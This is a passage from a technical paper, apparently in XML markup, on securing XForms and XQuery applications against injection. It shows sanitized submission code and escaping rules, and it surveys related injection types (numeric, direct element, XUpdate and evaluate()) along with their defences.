</textual></programlisting><para class="po-block e222 e222"><textual class="po-textual">Unfortunately, this would be tantamount to the unsafe Java realm that we've used as our first example!</textual></para><para class="po-block e223 e223"><textual class="po-textual">To secure this submission, we can just adapt one of the two methods used to secure XSLT accesses. This is especially straightforward with the Orbeon implementation that implements an
          </textual><code class="po-atom e224 e224"><textual class="po-textual">xxforms:variable</textual></code><textual class="po-textual"> extension very similar to XSLT variables. You can also go with FLOWR expressions or use </textual><code class="po-atom e225 e225"><textual class="po-textual">xforms:bind/@calculate</textual></code><textual class="po-textual"> definitions to store intermediate
        results and make them more readable but it is also possible to write a mega XPath 2.0 expression such as this one:</textual></para><programlisting class="po-block e226 e226" xml:space="preserve"><textual class="po-textual"> &lt;xforms:submission id="doSearch" method="get"
      resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?_query={encode-for-uri(concat(
            '//user[mail=''', 
             lower-case(normalize-space(replace(replace(instance('search'), '&amp;amp;', '&amp;amp;amp;'), '''', '&amp;amp;apos;'))), 
             ''']'))}"
      instance="result" replace="instance"/&gt;</textual></programlisting><para class="po-block e227 e227"><textual class="po-textual">The same methods can be applied using query parameters:</textual></para><programlisting class="po-block e228 e228" xml:space="preserve"><textual class="po-textual">  &lt;xforms:submission id="doSearch" method="get"
     resource="http://localhost:8080/orbeon/exist/rest/db/app/users/?mail={
          encode-for-uri(lower-case(instance('search')))
        }&amp;amp;_query={
          encode-for-uri('declare namespace request=''http://exist-db.org/xquery/request'';
                          //user[mail=request:get-parameter(''mail'',0)]')}"
      instance="result" replace="instance"/&gt;</textual></programlisting><para class="po-block e229 e229"><textual class="po-textual">This is working, but we can do much simpler relying on XForms to do the encoding all by itself!. The complete XForms model would then be:</textual></para><programlisting class="po-block e230 e230" xml:space="preserve"><textual class="po-textual">        &lt;xforms:model&gt;
            &lt;xforms:instance id="search"&gt;
                &lt;search xmlns=""&gt;
                    &lt;mail/&gt;
                    &lt;_query&gt;declare namespace request='http://exist-db.org/xquery/request';
                        //user[mail=request:get-parameter('mail',0)]&lt;/_query&gt;
                &lt;/search&gt;
            &lt;/xforms:instance&gt;
            &lt;xforms:instance id="result"&gt;
                &lt;empty xmlns=""/&gt;
            &lt;/xforms:instance&gt;
            &lt;xforms:submission id="doSearch" method="get" ref="instance('search')"
                resource="http://localhost:8080/orbeon/exist/rest/db/app/users/"
                instance="result" replace="instance"/&gt;
        &lt;/xforms:model&gt;</textual></programlisting></section><section class="po-hcontainer e231 e231" xml:id="evaluate"><title class="po-block e232 e232"><textual class="po-textual">Related Attacks</textual></title><para class="po-block e233 e233"><textual class="po-textual">We have explored in depth injections targeted on XQuery string literals. What about other injections on XML based applications?</textual></para><section class="po-hcontainer e234 e234"><title class="po-block e235 e235"><textual class="po-textual">XQuery Numeric Literal Injection</textual></title><para class="po-block e236 e236"><textual class="po-textual">It may be tempting to copy numeric input fields directly into XQuery expressions. That's safe if, and only if, these fields are validated. If not, the techniques that we've seen with
          string literals can easily be adapted (in fact, it's even easier for your attackers since they do not need to bother with quotes!).</textual></para><para class="po-block e237 e237"><textual class="po-textual">That's safe if you pass these values within request parameters but you will generate XQuery parsing errors if the input doesn't belong to the expected data type. Also note that </textual><link class="po-inline e238 e238" xlink:actuate="onRequest" xlink:href="http://demo.exist-db.org/exist/functions/request/get-parameter" xlink:show="new" xlink:type="simple"><textual class="po-textual">request:get-parameter()</textual></link><textual class="po-textual"> returns string values and may need casting in your XQuery query.</textual></para><para class="po-block e239 e239"><textual class="po-textual">In both cases, it is a good idea to validate numeric input fields before sending your query (this is a case where filters can be used without risking to get Tim O'Reilly angry)!</textual></para><para class="po-block e240 e240"><textual class="po-textual">When using XForms, this can be done by binding these inputs to numeric datatypes. Otherwise, use whatever language you are programming with to do the test.</textual></para><para class="po-block e241 e241"><textual class="po-textual">If you use literals and don't want (or can't) do that test outside the XQuery query itself, you can also copy the value in a string literal and explicitly cast it into the numeric data
          type you are using. The string literal then needs to be sanitized like we've already seen.</textual></para></section><section class="po-hcontainer e242 e242"><title class="po-block e243 e243"><textual class="po-textual">XQuery Direct Element Injection</textual></title><para class="po-block e244 e244"><textual class="po-textual">Literals are the location where user input is most likely copied in XQuery based applications (they cover all the cases where the database is queried according to parameters entered by
          our users) but there are cases where you may want to copy user input within XQuery direct element constructors.</textual></para><para class="po-block e245 e245"><textual class="po-textual">One of the use cases for this is the XQuery Update Facility where update primitives may contain direct element constructors, in which it is tempting to include input fields
          values.</textual></para><para class="po-block e246 e246"><textual class="po-textual">Here again you're safe if you use request parameters but you need to sanitize your input if you're doing direct copy.</textual></para><para class="po-block e247 e247"><textual class="po-textual">The danger here is not so much delimiters but rather enclosed expressions that let your attacker include arbitrary XQuery expressions.</textual></para><para class="po-block e248 e248"><textual class="po-textual">The </textual><code class="po-atom e249 e249"><textual class="po-textual">&lt;</textual></code><textual class="po-textual"> also needs to be escaped as it would be understood as a tag delimiter as well, of course as the </textual><code class="po-atom e250 e250"><textual class="po-textual">&amp;</textual></code><textual class="po-textual">..</textual></para><para class="po-block e251 e251"><textual class="po-textual">That makes 4 characters to escape:</textual></para><orderedlist class="po-table e252 e252"><listitem class="po-container e253 e253"><para class="po-block e254 e254"><code class="po-atom e255 e255"><textual class="po-textual">&amp;</textual></code><textual class="po-textual"> must be replaced by </textual><code class="po-atom e256 e256"><textual class="po-textual">&amp;amp;</textual></code></para></listitem><listitem class="po-container e257 e257"><para class="po-block e258 e258"><code class="po-atom e259 e259"><textual class="po-textual">&lt;</textual></code><textual class="po-textual"> must be replaced by </textual><code class="po-atom e260 e260"><textual class="po-textual">&amp;lt;</textual></code></para></listitem><listitem class="po-container e261 e261"><para class="po-block e262 e262"><code class="po-atom e263 e263"><textual class="po-textual">{</textual></code><textual class="po-textual"> must be replaced by </textual><code class="po-atom e264 e264"><textual class="po-textual">{{</textual></code></para></listitem><listitem class="po-container e265 e265"><para class="po-block e266 e266"><code class="po-atom e267 e267"><textual class="po-textual">}</textual></code><textual class="po-textual"> must be replaced by </textual><code class="po-atom e268 e268"><textual class="po-textual">}}</textual></code></para></listitem></orderedlist></section><section class="po-hcontainer e269 e269"><title class="po-block e270 e270"><textual class="po-textual">XUpdate injection</textual></title><para class="po-block e271 e271"><textual class="po-textual">XUpdate is safer than XQuery Update Facility since the latter has no support for enclosed expressions. That doesn't mean that </textual><code class="po-atom e272 e272"><textual class="po-textual">&amp;</textual></code><textual class="po-textual"> and </textual><code class="po-atom e273 e273"><textual class="po-textual">&lt;</textual></code><textual class="po-textual"> are not meant to be
          escaped but since XUpdate documents are a well formed XML documents, the tool or API that you'll be using to create this document will take care of that if it's an XML tool</textual></para><para class="po-block e274 e274"><textual class="po-textual">Unfortunately XUpdate uses XPath expressions to qualify the targets where updates should be applied, and if you use a database like eXist, which supports XPath 2.0 (or XQuery 1.0) in
          these expressions, this opens a door for attacks that are similar to XQuery literal injections.</textual></para><para class="po-block e275 e275"><textual class="po-textual">Again, if you use request parameters you'll be safe.</textual></para><para class="po-block e276 e276"><textual class="po-textual">If not, the sanitization to apply is the same as that for XQuery injection except that the XML tool or API that you'll be using should take care of the XML entities.</textual></para></section><section class="po-hcontainer e277 e277"><title class="po-block e278 e278"><textual class="po-textual">*:evaluate() injection</textual></title><para class="po-block e279 e279"><textual class="po-textual">Extension functions such as </textual><code class="po-atom e280 e280"><textual class="po-textual">saxon:evaluate</textual></code><textual class="po-textual"> (or eXist's </textual><code class="po-atom e281 e281"><textual class="po-textual">util:eval()</textual></code><textual class="po-textual">) are also prone to attacks similar to XQuery injection if user input is not properly
          sanitized.</textual></para><para class="po-block e282 e282"><textual class="po-textual">The consequences of these injections may be amplified by extension functions that provide read and write access to system resources but even vanilla XPath can be harmful with its
            </textual><code class="po-atom e283 e283"><textual class="po-textual">document()</textual></code><textual class="po-textual"> function that provides read access to the file system as well as network resources that may be behind the firewall protecting the server.</textual></para><para class="po-block e284 e284"><textual class="po-textual">These function calls need to be secured using similar techniques adapted to the context where the function is used.</textual></para><para class="po-block e285 e285"><textual class="po-textual">Defining variables out of the function call and using these variables within the function call is an effective solution quite similar to using query parameters in a query.</textual></para><note class="po-container e286 e286"><para class="po-block e287 e287"><textual class="po-textual">When such functions are called inside a query, you may have to sanitize twice! In that case, the second level of sanitization can be done in XQuery.</textual></para></note></section></section></section></article></classedDocument>